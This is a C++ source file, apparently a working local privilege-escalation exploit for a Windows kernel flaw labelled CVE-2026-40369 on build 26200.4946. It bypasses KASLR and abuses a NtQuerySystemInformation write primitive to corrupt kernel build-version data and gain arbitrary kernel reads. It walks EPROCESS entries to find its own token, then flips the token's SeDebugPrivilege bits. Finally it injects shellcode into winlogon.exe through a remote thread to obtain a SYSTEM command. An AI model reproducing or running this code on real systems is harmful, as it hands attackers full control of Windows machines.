#include "exp.hpp"
#include "include/common/gadget.hpp"
#include "include/common/memtools.hpp"
#include "include/common/shellcode.hpp"
namespace CVE_2026_40369
{
    bool checkApi() {
        if (!NtQuerySystemInformation || !NtQuerySystemInformationEx)
        {
            std::cout << "[-] Failed to get NtQuerySystemInformation/NtQuerySystemInformationEx\n";
            return false;
        }
        return true;
    }


    void SetProcessUtf8()
    {
        SetConsoleCP(65001);
        SetConsoleOutputCP(65001);
        setlocale(LC_ALL, ".UTF8");
        PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
        *(USHORT*)((BYTE*)peb + 0x34C) = 0xFDE9;
    };

    std::vector<BYTE> Utf8ToRawBytes(BYTE* utf8)
    {
        wchar_t wc = 0;
        MultiByteToWideChar(
            CP_UTF8,
            0,
            (const char*)utf8,
            -1,
            &wc,
            0
        );
        BYTE* p = (BYTE*)&wc;
        return { p[0], p[1] };
    }

    // 将尽可能多的 BYTE* 数据从 UTF-8 转为 UTF-16，然后提取原始字节
    std::vector<BYTE> RecoverOriginalBytes(
        const BYTE* utf8Data,
        ULONG utf8DataSize,
        ULONG originalByteCount)  // 需要恢复的原始字节数
    {
        std::vector<BYTE> result;

        if (utf8Data == nullptr || utf8DataSize == 0 || originalByteCount == 0)
            return result;

        // 第一步：UTF-8 → UTF-16，转换尽可能多的数据
        int wcharCount = MultiByteToWideChar(
            CP_UTF8,
            MB_ERR_INVALID_CHARS,  // 遇到无效字符就停止
            reinterpret_cast<LPCCH>(utf8Data),
            static_cast<int>(utf8DataSize),
            NULL,
            0
        );

        if (wcharCount <= 0) {
            // 可能整个缓冲区都没有完整字符，尝试不带 MB_ERR_INVALID_CHARS
            wcharCount = MultiByteToWideChar(
                CP_UTF8,
                0,  // 使用默认替换行为
                reinterpret_cast<LPCCH>(utf8Data),
                static_cast<int>(utf8DataSize),
                NULL,
                0
            );

            if (wcharCount <= 0)
                return result;
        }

        // 分配 UTF-16 缓冲区
        std::vector<wchar_t> utf16Buffer(wcharCount);

        int converted = MultiByteToWideChar(
            CP_UTF8,
            0,
            reinterpret_cast<LPCCH>(utf8Data),
            static_cast<int>(utf8DataSize),
            utf16Buffer.data(),
            wcharCount
        );

        if (converted <= 0)
            return result;

        // 第二步：从 UTF-16 提取原始字节
        result.reserve(originalByteCount);
        ULONG bytesRemaining = originalByteCount;

        for (int i = 0; i < converted && bytesRemaining > 0; i++) {
            wchar_t wc = utf16Buffer[i];

            // 低字节
            result.push_back(static_cast<BYTE>(wc & 0xFF));
            bytesRemaining--;

            // 高字节
            if (bytesRemaining > 0) {
                result.push_back(static_cast<BYTE>((wc >> 8) & 0xFF));
                bytesRemaining--;
            }
        }

        return result;
    }

    NTSTATUS vulnAddPtr(LPVOID addr, bool debug) {
        if (addr == nullptr || !checkApi())
            return STATUS_FAIL_CHECK;
        NTSTATUS status;
        ULONG returnLength = 0;
        status = NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemProcessInformationExtension,
            addr,
            0,
            &returnLength
        );

        if (debug) {
            printf("[*] NtQuerySystemInformation returned: 0x%08lX\n", status);
            printf("[*] Required length: %lu\n", returnLength);
            printf("[+] Done. If you see this, the writes succeeded without bugcheck.\n");
        }
        return status;
    }

    NTSTATUS queryBuildInfo(DWORD index, SYSTEM_BUILD_VERSION_INFORMATION* info, bool debug)
    {
        ULONG returnLength = 0;
        NTSTATUS status;

        status = NtQuerySystemInformationEx(
            (SYSTEM_INFORMATION_CLASS)SystemBuildVersionInformation,
            &index,
            sizeof(index),
            info,
            sizeof(*info),
            &returnLength);

        if (!NT_SUCCESS(status) && debug)
        {
            printf("Index %u: NTSTATUS = 0x%08X (ReturnLength = %u)\n", index, (unsigned int)status, returnLength);
            // return status;
        }
        if (debug) {
            printf("=== Layer %u ===\n", index);
            printf("  LayerIndex:        %u\n", info->LayerIndex);
            printf("  LayerVersionCount: %u\n", info->LayerVersionCount);
            printf("  Field_04:          0x%08X (%u)\n", info->Field_04, info->Field_04);
            printf("  Field_08:          0x%08X (%u)\n", info->Field_08, info->Field_08);
            printf("  Field_0C:          0x%08X (%u)\n", info->Field_0C, info->Field_0C);
            printf("  Field_10:          0x%08X (%u)\n", info->Field_10, info->Field_10);
            printf("  String1:           \"%s\"\n", info->String1);
            printf("  String2:           \"%s\"\n", info->String2);
            printf("  String3:           \"%s\"\n", info->String3);
            printf("  String4:           \"%s\"\n", info->String4);
            printf("  String5:           \"%s\"\n", info->String5);
            printf("  String6:           \"%s\"\n", info->String6);
            printf("  Field_240:         0x%08X (%u)\n", info->Field_240, info->Field_240);
            printf("\n");
        }

        return status;
    }

    seDebugResult CheckSeDebugPrivilege()
    {
        HANDLE hToken = NULL;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return CANT_OPEN;

        DWORD dwSize = 0;
        GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
        PTOKEN_PRIVILEGES pPrivs =
            (PTOKEN_PRIVILEGES)malloc(dwSize);
        if (!pPrivs)
        {
            CloseHandle(hToken);
            return CANT_OPEN;
        }
        if (!GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize))
        {
            free(pPrivs);
            CloseHandle(hToken);
            return CANT_OPEN;
        }

        // 获取 SeDebugPrivilege 的 LUID
        LUID debugLuid;
        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &debugLuid))
        {
            free(pPrivs);
            CloseHandle(hToken);
            return CANT_OPEN;
        }
        BOOL found = FALSE;
        BOOL enable = FALSE;
        for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++)
        {
            LUID luid = pPrivs->Privileges[i].Luid;
            if (luid.LowPart == debugLuid.LowPart &&
                luid.HighPart == debugLuid.HighPart)
            {
                found = TRUE;
                DWORD attr = pPrivs->Privileges[i].Attributes;
                if (attr & SE_PRIVILEGE_ENABLED)
                    enable = TRUE;
                break;
            }
        }

        free(pPrivs);
        CloseHandle(hToken);

        if (!found) return DONT_HAVE;
        else {
            if (enable)
                return SUCCESS;
            else
                return NOT_ENABLE;
        }
    }

    bool InjectToWinlogon()
    {
        DWORD pid = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS,
            0);

        if (hSnap == INVALID_HANDLE_VALUE)
            return 0;

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);

        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                if (!_wcsicmp(pe.szExeFile, L"winlogon.exe"))
                {
                    pid = pe.th32ProcessID;
                    break;
                }

            } while (Process32NextW(hSnap, &pe));
        }

        CloseHandle(hSnap);

        if (pid < 0)
        {
            printf("Could not find process\n");
            return false;
        }
        printf("[+] found winlogon pid: %d\n", pid);
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!h)
        {
            printf("Could not open process: %x", GetLastError());
            return false;
        }

        void* buffer = VirtualAllocEx(h, NULL, sizeof(exploit::shellcode::RunCmd), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!buffer)
        {
            printf("[-] VirtualAllocEx failed\n");
            return false;
        }

        if (!buffer)
        {
            printf("[-] remote allocation failed");
            return false;
        }

        if (!WriteProcessMemory(h, buffer, exploit::shellcode::RunCmd, sizeof(exploit::shellcode::RunCmd), 0))
        {
            printf("[-] WriteProcessMemory failed");
            return false;
        }

        HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

        if (hthread == INVALID_HANDLE_VALUE)
        {
            printf("[-] CreateRemoteThread failed");
            return false;
        }

        return true;
    }

    std::vector<BYTE> arbitraryRead(DWORD index, PVOID victimAddr, PVOID targetAddr, DWORD size) {
        std::vector<BYTE>result = {};
        // 1.构建 SYSTEM_BUILD_VERSION_INFORMATION
        SYSTEM_BUILD_VERSION_INFORMATION info1 = { 0 };
        queryBuildInfo(0, &info1, false);
        auto fakePtr = reinterpret_cast<_FAKE_VERSION_STRUCT*>(victimAddr);
        RtlCopyMemory(fakePtr, &info1.Field_04, 0x10);
        fakePtr->us1.Length = size * 3;
        fakePtr->us1.MaximumLength = size * 3;
        fakePtr->us1.Padding = 0;
        fakePtr->us1.Buffer = reinterpret_cast<ULONG64>(targetAddr);

        // 2.通过查询实现任意地址读
        SYSTEM_BUILD_VERSION_INFORMATION info2 = { 0 };
        queryBuildInfo(index, &info2, false);
        result = RecoverOriginalBytes(reinterpret_cast<BYTE*>(info2.String1), size * 3, size);

        return result;
    }

    bool Exp() {
        if (!checkApi)
            return false;
        SetProcessUtf8();
        ULONG_PTR kernelBase = KALSR_Bypass();
        // ULONG_PTR kernelBase = 0xfffff800e9600000;
        if (kernelBase == 0) {
            printf("[x] Can't Leak Kernel Base Address\n");
            return false;
        }
        else {
            printf("[*] Kernel Base Address: 0x%p\n", kernelBase);
        }
        auto versionCountAddr = kernelBase + exploit::gadget::X_26200_4946::CmpLayerVersionCount;
        auto versionsAddr = kernelBase + exploit::gadget::X_26200_4946::CmpLayerVersions;
        printf("[*] CmpLayerVersionCount: %p\n", versionCountAddr);
        printf("[*] CmpLayerVersions: %p\n", versionsAddr);

        // 增大count值知道覆写
        SYSTEM_BUILD_VERSION_INFORMATION info = {};
        queryBuildInfo(0, &info, false);

        for (;info.LayerVersionCount < 11;)
        {
            printf(".");
            vulnAddPtr(reinterpret_cast<LPVOID>(versionCountAddr - 11), false);
            queryBuildInfo(0, &info, false);
        }
        printf("\n");
        queryBuildInfo(0, &info, false);

        //生成fake buffer
        vulnAddPtr(reinterpret_cast<LPVOID>(versionsAddr + 0x8 * 6), true);
        printf("[*] victim version buildinfo %p\n", versionsAddr + 0x8 * 6);

        //尝试定位fake buffer
        char leakbuffer[0x1000] = { 0 };
        vulnAddPtr(reinterpret_cast<LPVOID>(leakbuffer), true);

        auto fakeAddr = *((DWORD64*)(leakbuffer));
        auto fakeAlignedAddr = fakeAddr >> 8 << 8;
        auto fakeBulidInfo = VirtualAlloc(reinterpret_cast<LPVOID>(fakeAlignedAddr), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        printf("[*] origin at 0x%p, want allocate at 0x%p, victim chunk at 0x%p\n", fakeAddr, fakeAlignedAddr, fakeBulidInfo);

        if (!fakeBulidInfo) {
            printf("[x] Allocate failed\n");
            return false;
        }
        for (size_t i = 0; i < 0x1000; i++)  // 创建唯一标识符便于定位
            ((unsigned char*)fakeBulidInfo)[i] = i % 0x100;
        printf("[*] buffer inited\n");

        //进行定位
        queryBuildInfo(6, &info, false);
        auto offset = reinterpret_cast<unsigned char*>(&info)[4];
        auto fakeVerAddr = offset + reinterpret_cast<ULONG_PTR>(fakeBulidInfo);
        printf("[*] get offset value: 0x%p, so Versions at: 0x%p\n", offset, fakeAddr); //得到结果


        ULONG_PTR EPROCESSAddr;
        ULONG_PTR systemTokenAddr;
        ULONG_PTR systemTokenValue;

        auto result = arbitraryRead(
            6,
            reinterpret_cast<PVOID>(fakeVerAddr),
            reinterpret_cast<PVOID>(kernelBase + exploit::gadget::X_26200_4946::PsInitialSystemProcess),
            0x8); //尝试任意读取

        EPROCESSAddr = *reinterpret_cast<ULONG_PTR*>(result.data());

        systemTokenAddr = EPROCESSAddr + exploit::gadget::X_26200_4946::EPROCESS::Token;

        printf("[+]leak system eprocess address: 0x%p\n", EPROCESSAddr);
        printf("[+]leak system token address: 0x%p\n", systemTokenAddr);

        result = arbitraryRead(
            6,
            reinterpret_cast<PVOID>(fakeVerAddr),
            reinterpret_cast<PVOID>(systemTokenAddr),
            0x8); //尝试任意读取
        systemTokenValue = *reinterpret_cast<ULONG_PTR*>(result.data());
        printf("[+]leak system token value: 0x%p", systemTokenValue);
        systemTokenValue &= 0xfffffffffffffff0;
        printf(", but should be 0x%p\n", systemTokenValue);

        ULONG_PTR currentBase = EPROCESSAddr;
        DWORD selfPid = GetCurrentProcessId();
        DWORD pid = 0;
        bool isFound = false;
        for (size_t i = 0; i < 2000; i++)
        {
            printf(".");
            result = arbitraryRead( //读取activate link list
                6,
                reinterpret_cast<PVOID>(fakeVerAddr),
                reinterpret_cast<PVOID>(currentBase + exploit::gadget::X_26200_4946::EPROCESS::ActiveProcessLinks),
                0x8);
            currentBase = *reinterpret_cast<ULONG_PTR*>(result.data()) - exploit::gadget::X_26200_4946::EPROCESS::ActiveProcessLinks; //下一个进程的EPROCESS
            result = arbitraryRead( //读取 当前eprocess.pid
                6,
                reinterpret_cast<PVOID>(fakeVerAddr),
                reinterpret_cast<PVOID>(currentBase + exploit::gadget::X_26200_4946::EPROCESS::UniqueProcessId),
                sizeof(DWORD));
            pid = *reinterpret_cast<DWORD*>(result.data());
            if (pid == selfPid) {
                printf("\n[+]current eprocess: %p", currentBase);
                isFound = true;
                break;
            }
        }
        printf("\n");
        if (!isFound) {
            printf("[*]can't locate current eprocess\n");
            getchar();
            return false;
        }

        ULONG_PTR processTokenAddr = currentBase + exploit::gadget::X_26200_4946::EPROCESS::Token;
        result = arbitraryRead( //读取 当前eprocess.pid
            6,
            reinterpret_cast<PVOID>(fakeVerAddr),
            reinterpret_cast<PVOID>(processTokenAddr),
            sizeof(ULONG_PTR));
        ULONG_PTR processTokenValue = *reinterpret_cast<ULONG_PTR*>(result.data());
        processTokenValue &= 0xfffffffffffffff0;
        ULONG_PTR presentDebugPriv = processTokenValue + exploit::gadget::X_26200_4946::_SEP_TOKEN_PRIVILEGES + 2;
        ULONG_PTR enableDebugPriv = processTokenValue + exploit::gadget::X_26200_4946::_SEP_TOKEN_PRIVILEGES + 10;
        printf("[+]token address: 0x%p = 0x%p\n", processTokenAddr, processTokenValue);
        printf("[+]try to overwrite token's present: 0x%p, enable: 0x%p\n", presentDebugPriv, enableDebugPriv);

        for (seDebugResult privResult = CANT_OPEN; privResult != SUCCESS; privResult = CheckSeDebugPrivilege())
        {
            printf(">");
            if (privResult == DONT_HAVE) {
                vulnAddPtr(reinterpret_cast<LPVOID>(presentDebugPriv), false);
            }
            else if (privResult == NOT_ENABLE) {
                vulnAddPtr(reinterpret_cast<LPVOID>(enableDebugPriv), false);
            } if (privResult == NOT_ENABLE) {
                printf("[-]can't check process privllege\n");
                vulnAddPtr(reinterpret_cast<LPVOID>(presentDebugPriv), false);
                vulnAddPtr(reinterpret_cast<LPVOID>(enableDebugPriv), false);
            }
        }
        printf("\n");

        // getchar();
        // system("cmd.exe");
        if (!InjectToWinlogon()) {
            printf("\n[-]can't inject to Winlogon process\n");
            return false;
        }

        return true;
    }
} // namespace CVE_2026_40369